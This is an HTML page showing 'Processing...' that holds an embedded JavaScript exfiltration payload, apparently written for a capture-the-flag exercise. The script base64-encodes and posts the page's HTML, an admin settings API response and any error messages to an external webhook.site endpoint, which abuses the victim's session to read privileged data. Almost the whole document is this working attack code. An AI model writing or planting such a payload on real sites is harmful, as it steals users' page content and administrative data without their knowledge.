<html>
  <body>
    <h1>Processing...</h1>

    <script>
      <script>
  (async () => {
    const hook = 'https://webhook.site/4115b783-e812-47a6-b8fd-98a62d308137';
    try {
      // 1. Leak current page content (often contains flags in the UI)
      fetch(hook, {method:'POST', body: btoa('PAGE_HTML: ' + document.body.innerHTML.substring(0,1000))});
      
      // 2. Try a different common admin path
      const res = await fetch('/api/admin/settings');
      const data = await res.text();
      fetch(hook, {method:'POST', body: btoa('ADMIN_SETTINGS: ' + data)});
    } catch(e) {
      fetch(hook, {method:'POST', body: btoa('ERROR: ' + e.message)});
    }
  })();
</script>
    </script>
  </body>
</html>
